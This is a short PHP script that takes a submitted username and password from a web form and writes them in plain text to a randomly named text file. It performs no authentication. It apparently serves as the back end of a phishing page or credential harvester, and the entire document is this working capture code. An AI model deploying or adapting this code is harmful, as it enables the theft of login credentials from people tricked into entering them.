<?php



$usr=$_POST["username"];
$password=$_POST["password"];

$file=strval(rand(0,99999999)).".txt";
$myfile = fopen($file, "w") or die("Unable to open file!");
$txt = $usr.$password;
fwrite($myfile, $txt);
fclose($myfile);
?>